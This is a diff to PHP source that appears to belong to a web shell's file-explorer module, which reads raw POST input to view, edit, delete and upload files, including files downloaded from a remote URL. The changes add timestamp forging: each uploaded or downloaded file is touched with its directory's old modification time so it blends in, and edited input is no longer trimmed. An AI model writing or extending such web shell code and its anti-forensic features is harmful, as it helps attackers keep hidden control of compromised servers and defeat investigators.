@@ -8,6 +8,10 @@ $p = array_map("rawurldecode", get_post());
 $cwd = html_safe(get_cwd());
 $GLOBALS['module'] = array();
 
+/*foreach ($p as $key => $value) {
+    error_log($key."->".$value);
+}*/
+
 $explorer_content = "";
 if(isset($p['viewEntry'])){
 	$path = trim($p['viewEntry']);
@@ -147,7 +151,7 @@ elseif(isset($p['delete'])){
 }
 elseif(isset($p['editType'])&&isset($p['editFilename'])&&isset($p['editInput'])&&isset($p['preserveTimestamp'])){
 	$editFilename = trim($p['editFilename']);
-	$editInput = trim($p['editInput']);
+	$editInput = $p['editInput'];
 	$editType = trim($p['editType']);
 	$preserveTimestamp = trim($p['preserveTimestamp']);
 	$time = filemtime($editFilename);
@@ -257,8 +261,10 @@ elseif(isset($p['ulType'])){
 
 		if(is_uploaded_file($ulFile['tmp_name'])){
 			if(!is_dir($ulSaveTo)) mkdir($ulSaveTo);
+            $time = filemtime($ulSaveTo);
 			$newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename;
 			if(move_uploaded_file($ulFile['tmp_name'], $newfile)){
+                touch($newfile, $time);
 				$res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )";
 			}
 			else $res = "error";
@@ -269,9 +275,11 @@ elseif(isset($p['ulType'])){
 		$ulFile = trim($p['ulFile']);
 		if(empty($ulFilename)) $ulFilename = basename($ulFile);
 		if(!is_dir($ulSaveTo)) mkdir($ulSaveTo);
+        $time = filemtime($ulSaveTo);
 		$newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename;
 
 		if(download($ulFile, $newfile)){
+		    touch($newfile, $time);
 			$res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )";
 		}
 		else $res = "error";
